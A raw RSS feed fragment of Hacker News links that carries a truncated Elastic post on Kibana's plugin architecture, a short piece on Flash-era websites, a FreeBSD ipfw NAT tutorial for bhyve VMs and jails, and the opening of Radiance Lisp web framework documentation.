</p> <p><strong><h2>The Kibana development platform, a grown-up application framework</h2></strong> <strong><h3>Goals</h3></strong></p><p>The primary goal of the Kibana platform project was to increase both the velocity and stability of adding new features. To fulfill this goal, we needed to make Kibana’s codebase easy to change, easy to learn, and easy to thoroughly test.
</p><p>To achieve these goals we produced a list of features that this new architecture should have:
</p><ul><li>Consistent architecture across client and server code</li><li>A small, explicit set of foundational APIs that is separate from plugin code</li><li>Simple and well-defined plugin runtime and execution flow</li><li>Isolated plugins with explicit APIs and dependencies</li><li>Framework-agnostic and futureproof APIs</li><li>Full test coverage</li><li>Type safety</li></ul> <p><strong><h3>Microservices</h3></strong></p><p>One of the key problems with our legacy code was how much it was slowing down individual teams from iterating quickly.
</p><p>The popular microservices trend is often the recommended pattern to reach for when re-architecting a system to solve this problem. By breaking up responsibilities into independent systems with clear boundaries, each team can work within their domains with fewer cross-cutting concerns.
</p><p>Microservices proper aren’t an option for Kibana, which is deployed as a single artifact on millions of our customers’ own machines. Simple deployment and configuration is a goal of all products at Elastic. Breaking up Kibana into smaller, separate deployments would complicate that.
</p><p>However, similar benefits can be realized by enabling strict encapsulation between components. The original Kibana architecture allowed for many components to affect the entire system, often in unexpected ways. By facilitating and enforcing encapsulation with explicit boundaries and dependencies between subsystems, we focused on achieving many of the same benefits without complicating our deployment story.
</p><p>We see the Kibana platform as a hybrid approach: a single artifact that you can download and run on your laptop, but built with explicit boundaries between its pluggable systems.
</p><p>With this design, we avoid the complexity of deploying microservices and handling network failures, while still promoting the isolation between systems that enables teams to move quickly.
</p> <p><strong><h2>Key aspects of the Kibana platform</h2></strong> <strong><h3>Core</h3></strong></p><p>The Kibana core is the root system that boots Kibana, validates configuration, loads plugins, and provides the primitive APIs needed to build a plugin in Kibana. When you run <code>./bin/kibana</code> or load Kibana in your browser this is the system that starts executing first.
</p><p>The core is made up of a set of <strong>services</strong>, each of which provides APIs to plugins at different points of the system’s lifecycle. Core services are always present and cannot be disabled. Anything we consider to be essential to building a Kibana plugin exists as a core service.
</p><p>The underlying implementation details of core services are encapsulated and hidden from plugins. This yields a number of benefits, not the least of which is high test coverage. By only allowing plugins access to purpose-built features, we can ensure that the core’s small API surface is incredibly robust.
</p><p>The core also aims to be framework and technology agnostic. We want this platform to grow with the project for years to come. Locking the entire project into one technology has bitten us in the past (Angular.js, Hapi.js) and is a decision we plan to avoid going forward. When possible, we prefer to provide primitives or well-formed abstractions over specific frameworks. For instance, applications in the Kibana platform can be written using virtually any UI framework (though we prefer React and our EUI library) and our HTTP interface is a very generic abstraction over Hapi.js. This allows plugins to experiment with and adopt new technologies and allows the core to remove underlying frameworks without breaking the interface provided to plugins.
</p> <p><strong><h3>Plugins</h3></strong></p><p>While the core provides the foundation of Kibana, plugins are where the magic happens. Virtually every feature you use in Kibana is built inside of a plugin. In general, a plugin is a group of functionalities that can be toggled on or off to provide features and apps in Kibana.
</p><p>Plugins have access to all of the APIs exposed by core services. But the really neat thing about plugins is that they may have dependencies on other plugins. This allows plugins to integrate at runtime via explicit contracts that these plugins expose to one another. Plugins can expose something as simple as a small integration API or provide a feature-rich service to other plugins. This allows us to keep adding new services to Kibana without expanding the API surface of the core. By baking this feature into the platform’s design, we can make sure that changes to these interfaces are well understood and communicated.
</p><p>So what can a plugin do? Well, they can register HTTP endpoints and UI applications, query and create data in Elasticsearch, and provide generic services to other plugins. In other words, quite a bit.
</p> <p><strong><h3>Lifecycles</h3></strong></p><p>All core services and plugins are organized and executed in the same set of lifecycle stages: setup, start, and stop. Both the client and server execute these lifecycle stages sequentially when starting Kibana.
</p><p>Different sets of functionality are available during each lifecycle stage. It is up to each service and plugin to return the APIs it wishes to expose during these lifecycle stages for other services and plugins to consume.
</p><p>By organizing all of Kibana around these stages, we make reasoning about <em>when</em> code will execute much simpler and have tight control over which features are available to other components at different points in time.
</p> <p><strong><h3>Server and browser</h3></strong></p><p>Up until this point we’ve talked about the core as if it’s a single system. However, that isn’t <em>quite</em> true. In reality, we have a server-side and client-side core. Each follows a similar design but is made up of a slightly different set of services.
</p><p>As you might expect, the server-side services provide typical backend functionality, like HTTP routes, while the client-side services provide frontend functionality, like UI mounting. But while the set of APIs is different, both systems share the same design, patterns, and lifecycle stages.
</p><p>This makes learning how to build a Kibana plugin much simpler. In legacy Kibana, developers had to learn about Hapi’s plugin system on the server and Angular’s module system in the browser. Developers today can learn a single pattern for building plugins that is portable between the two environments.
</p> <p><strong><h2>Results</h2></strong></p><p>Leveraging this design, the Kibana teams have been incrementally migrating their plugins to the Kibana platform APIs over the past several minor versions. Today, we’re happy to report that all applications will be running on the platform as of version 7.9.0 (coming soon).
</p><p>One of the biggest improvements users of Kibana will notice with this change is a much faster navigation experience between applications. We have removed the “loading screen of death” (as some call it) when switching between applications, enabling you to quickly find, analyze, and share your data. In 7.9, you will be able to flip between Dashboard, Maps, Canvas, APM, and all your other favorite Kibana apps nearly instantly! Gone are the days of the loading screen breaking your flow.
</p><p><img src="https://play.vidyard.com/WeKZ5mfwug3ng8gDPjSZgE.jpg" data-uuid="WeKZ5mfwug3ng8gDPjSZgE" data-v="4" data-type="inline" data-autoplay="1" data-loop="1" data-hidden_controls="1" data-muted="0" muted=""></p><p>But this is just the beginning. Developers at Elastic are now able to build features faster, more efficiently, and produce better code. For Kibana users, this translates to more features in every release! No matter which solutions you are using — <a href="https://www.elastic.co/enterprise-search">Elastic Enterprise Search</a>, <a href="https://www.elastic.co/observability">Observability</a>, or <a href="https://www.elastic.co/security">Security</a> — expect the capabilities to grow even faster.
</p> <p><strong><h2>Further reading for plugin developers</h2></strong></p><p>As we’ve rolled out these changes, we’ve introduced significant changes to our experimental plugin API available to non-Elastic plugin developers. If you are a developer that maintains a Kibana plugin, you will need to update your plugin to work with future versions of Kibana. Our incremental approach has led to churn in the experimental API and we generally recommend …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana">https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana</a></em></p>]]>
            </description>
            <link>https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700214</guid>
            <pubDate>Wed, 01 Jul 2020 11:17:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Dark Ages]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23700075">thread link</a>) | @jslakro
<br/>
July 1, 2020 | https://pavellaptev.github.io/web-dark-ages/ | <a href="https://web.archive.org/web/*/https://pavellaptev.github.io/web-dark-ages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>Now it’s abandoned, but a lot of websites were built on FLASH technologies.</p>
          <p>Basic HTML technologies didn’t provide enough tools and methods for designers to express their ideas and FLASH which was used commonly to create an animation and interactive presentations stepped into the Web.</p>
          <p>For designers who wanted to do web — FLASH websites were the breath of fresh air. Everything you can imagine was possible — from complex interactive animations to 3D.</p>
          <p>The main source of inspiration was thefwa.com and it was an honor to add an FWA label on a website.</p>
          <p>Sounds good, right? But what happened with FLASH then? Well, briefly it wasn’t secure, it was heavy to load, Apple effect and HTML5.</p>
          <p>Unfortunately, I can’t provide any links to you, because you can’t open them, FLASH technology is deadly dead right now.</p>
          <p>It’s hard to imagine right now but FLASH was a big part of the internet not so far ago — websites, games, banners and I think that more than 50% of all designers portfolio was built on FLASH.</p>
        </div></div>]]>
            </description>
            <link>https://pavellaptev.github.io/web-dark-ages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700075</guid>
            <pubDate>Wed, 01 Jul 2020 10:52:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple ipfw NAT for bhyve virtual machines and vnet jails on FreeBSD]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23700040">thread link</a>) | @0mp
<br/>
July 1, 2020 | https://adventurist.me/posts/00304 | <a href="https://web.archive.org/web/*/https://adventurist.me/posts/00304">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |
|                 ^                   |
|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |
|            +---------+              |
| 10.0.4.1   | bridge0 |              |
|            +----+----+              |
|                 ^                   |
|                 | 10.0.4.0/24       |
|      ___________+_______________    |
|      |       |        |        |    |
|      v       v        v        v    |
|  +---+--+ +--+---+ +--+---+ +--+---+|
|  | jail | |  vm  | | jail | | ...  ||
|  +------+ +------+ +------+ +------+|
+-------------- laptop ---------------+
</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

		
	<section>
	
</section></section></div>]]>
            </description>
            <link>https://adventurist.me/posts/00304</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700040</guid>
            <pubDate>Wed, 01 Jul 2020 10:47:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Radiance: A Web Application Environment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23699984">thread link</a>) | @rauhl
<br/>
July 1, 2020 | https://shirakumo.github.io/radiance/ | <a href="https://web.archive.org/web/*/https://shirakumo.github.io/radiance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article> <header>  <img src="https://shirakumo.github.io/radiance/radiance.png" alt="Logo">    <span>2.0.1</span>  <nav>    <a href="https://shirakumo.github.io/radiance/index.html">English</a>    <a href="https://shirakumo.github.io/radiance/index-ja.html">Japanese</a>  </nav>  <p>A web application environment.</p>  <nav>    <a href="https://shirakumo.github.io/radiance/index.html">radiance</a>    </nav> </header> <section id="documentation"><h2 id="about_radiance">About Radiance</h2> <p>Radiance is a web application environment, which is sort of like a web framework, but more general, more flexible. It should let you write personal websites and generally deployable applications easily and in such a way that they can be used on practically any setup without having to undergo special adaptations.</p> <h2 id="getting_it">Getting It</h2> <p>Radiance and associated modules and applications are distributed via Quicklisp in a separate dist. To install Radiance, do:</p> <pre><code>(ql-dist:install-dist "http://dist.tymoon.eu/shirakumo.txt")
(ql:quickload :radiance)
</code></pre> <p>From there on out you should be able to load and use any kind of Radiance module like <a href="https://github.com/Shirakumo/purplish">Purplish</a> directly via Quicklisp's <code>quickload</code>.</p> <h2 id="a_lengthy_and_in-depth_example">A Lengthy and In-Depth Example</h2> <p>You can find a tutorial that introduces Radiance and most of the important concepts, and explores how to write a web application in general, <a href="https://github.com/Shirakumo/radiance-tutorial/blob/master/Part%200.md">here</a>. It should give you a good feeling for how to go about things, and give you pointers about where to look if you need a particular feature. In the last part it'll also go into the actual setup and deployment of a Radiance installation on a production server.</p> <h2 id="a_simple_example">A Simple Example</h2> <p>The most basic thing you most likely want to do is serve some kind of HTML. So let's work towards that and gradually extend it. Before we can begin, we need to start up Radiance.</p> <pre><code>(ql:quickload :radiance)
(<a href="#FUNCTION%20RADIANCE-CORE%3ASTARTUP">radiance:startup</a>)</code></pre> <p>If this is your first time setting up Radiance, you'll get a note about it using the <code>r-welcome</code> module. It should also give you a link that you can open in your browser to see a little greeting page. For now we'll just want to put up our own little page alongside it.</p> <pre><code>(<a href="http://l1sp.org/cl/in-package">in-package</a> :rad-user)

(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (setf (<a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3A%28SETF%20CONTENT-TYPE%29">content-type</a> <a href="#VARIABLE%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a>) "text/plain") 
  "Hi!")</code></pre> <p>Visiting <a href="http://localhost:8080/example">localhost:8080/example</a> should now just show "Hi". Rather boring indeed. So let's spit out some HTML instead. For now, we'll use <a href="http://weitz.de/cl-who/">cl-who</a> since it is very simple.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>A recompile and refresh later and we have some font styling going on. Next we'll probably want to add a CSS file to it to style it properly. We could serve the CSS using another page as well, but that isn't the best way to go about things in the long term.</p> <p>Let's instead look at how to create a module, which will allow us to organise things in a more orderly fashion. You can create the files for a module manually, but for now we'll settle with an automatically generated skeleton that Radiance can provide you with.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3ACREATE-MODULE">create-module</a> "example")</code></pre> <p>It should return you a path on which the module resides. It should contain an ASDF system, a main lisp file, and two folders, <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> and <code>template</code>. Surprisingly enough, the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder is where statically served files go, and <code>template</code> is for template documents, if you happen to use a template system.</p> <p>Let's open up the <code>example.lisp</code> and carry over our example page from it.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Pages are identified by a name symbol. Since we now have our own module, and thus our own package, the example symbol above won't be the same as the one we've used before. We'll just have to remove the page in the <code>rad-user</code> package to avoid the clash.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3AREMOVE-PAGE">remove-page</a> 'rad-user::example)</code></pre> <p>Next let's create a simple CSS file to spruce things up a little. The file will be <code>example.css</code> placed in the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder. Here's a sample CSS if you don't want to write your own.</p> <pre><code>body{
    font-family: sans-serif;
    font-size: 12pt;
    background: #EEE;
}

header{
    text-align: center;
}

main{
    width: 800px;
    margin: 0 auto 0 auto;
    background: #FFF;
    padding: 10px;
    border: 1px solid #BBB;
    border-radius: 5px;
}</code></pre> <p>Next we need to modify our HTML to actually link to the style sheet. In order to get the address to the stylesheet we'll have to make use of Radiance's routing system. Don't worry though, it's not much of a hassle.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page")
             (:link :rel "stylesheet" :type "text/css" 
                    :href (<a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a> "/static/example/example.css" :representation :external)))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Refresh the page, and voilà, now it's got some pizzazz to it too. You'll probably want an explanation for the whole <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> business. Explaining it in full is handled by the sections following this one, but the gist of it is that it ensures that the link to the static file is properly resolved under any setup.</p> <h2 id="1._radiance_concepts_&amp;_parts">1. Radiance Concepts &amp; Parts</h2> <h3 id="1.1_uri">1.1 URI</h3> <p>One of the most central concepts in Radiance is that of a URI. A URI is an object that consists of a list of domains, an optional port number, and a path (see <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>). It is essentially a stripped down version of a general URI, and as such doesn't include a schema, query, or fragment part. Another important difference is that the <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code> URIs are used at several points throughout the framework, both to capture locations and to handle dispatch matching.</p> <p>Note that URIs are mutable. This is important for performance, as URI modifications have to happen in several parts that lie on the critical path. However, in the usual case it is not expected that URIs are modified outside of a few select functions. Modifying a URI's parts in unexpected ways may lead to strange behaviour.</p> <p>URIs have a unique string representation and can be serialised to string and parsed back into a full URI object again. URIs can also be dumped to FASL files as literals, so emitting them from macros is fine. The syntax for a URI is as follows:</p> <pre><code>URI     ::= DOMAINS? (':' PORT)? '/' PATH?
DOMAINS ::= DOMAIN ('.' DOMAIN)*
DOMAIN  ::= ('a'..'Z' | '0'..'9' | '-')
PORT    ::= ('0'..'9'){1, 5}
PATH    ::= .*</code></pre> <p>You can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> to turn a URI into a concrete URL. Reversal, encoding, and proper formatting of all the parts is handled for you automatically there.</p> <p>See <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APORT">port</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AMATCHER">matcher</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-STRING">uri-string</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URI">make-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URL">make-url</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AENSURE-URI">ensure-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOPY-URI">copy-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APARSE-URI">parse-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3C">uri&lt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3E">uri&gt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3D">uri=</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-MATCHES">uri-matches</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMERGE-URIS">merge-uris</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREPRESENT-URI">represent-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code>.</p> <h3 id="1.2_request_and_response">1.2 Request and Response</h3> <p>In order to encapsulate the data that is sent to  and from, we have the idea of a Request (<code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>) and Response (<code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>) object. The Request object holds the URI that represents to which location the request goes, and all the data contained in the HTTP payload like post, get, header, and cookie variables. The Response object holds the return-code, headers, cookies, and the actual body data.</p> <p>During the processing of a request, these two objects must always be present and bound to the <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code> and <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code> variables. They encapsulate a lot of very vital information that is necessary to generate dynamic pages. Additionally, the Request contains an opaque <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code> table in which you can store arbitrary data. This is useful when you need to exchange pieces of information between individual parts of the system that may be reached during the request execution.</p> <p>Requests don't necessarily have to come from the HTTP server. In order to test things you can also construct a request yourself and send it out programmatically. Whatever the case, the primary interface to dispatch a request is called <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>. This will construct a Request and Response object for you and appropriately handle the URI. If you want to do that yourself and <em>really</em> just send out a complete Request object, you can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>.</p> <p>For the actual handling of a request, see dispatchers, pages, and API endpoints.</p> <p>See <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-EXTERNAL-FORMAT%2A">*default-external-format*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-CONTENT-TYPE%2A">*default-content-type*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-METHOD">http-method</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APOST-DATA">post-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AGET-DATA">get-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AUSER-AGENT">user-agent</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREFERER">referer</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AREMOTE">remote</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AISSUE-TIME">issue-time</a></code>, <code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ARETURN-CODE">return-code</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACONTENT-TYPE">content-type</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXTERNAL-FORMAT">external-format</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ANAME">name</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AVALUE">value</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXPIRES">expires</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-ONLY">http-only</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ASECURE">secure</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE-HEADER">cookie-header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AGET-VAR">get-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST-VAR">post-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST%2FGET">post/get</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHEADER">header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AFILE">file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREDIRECT">redirect</a></code>, <code><a 